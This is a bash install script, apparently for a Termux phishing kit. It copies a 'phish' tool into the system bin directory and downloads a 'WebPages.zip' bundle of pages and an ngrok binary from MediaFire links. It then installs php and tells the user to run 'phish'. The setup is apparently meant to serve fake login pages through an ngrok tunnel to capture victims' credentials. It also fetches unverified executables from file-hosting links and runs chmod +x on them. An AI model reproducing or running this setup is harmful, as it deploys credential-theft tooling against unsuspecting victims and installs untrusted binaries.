#! /bin/bash
cp -r details /data/data/com.termux/files/usr/bin
cp -r phish /data/data/com.termux/files/usr/bin
cd /data/data/com.termux/files/usr/bin
chmod 765 details
chmod 765 phish
cd
cd Phishing
wget https://download1495.mediafire.com/soqyptjf4cag/h4m5t1msnr8zd47/WebPages.zip
unzip WebPages.zip
rm -rf WebPages.zip
rm -rf phish
rm -rf details
cd
wget https://download1614.mediafire.com/tky3ndygpp9g/650jb9laqs44qhn/ngrok

chmod +x *

pkg install gem -y
gem install lolcat
pkg install php



echo "run tool by writing - phish"
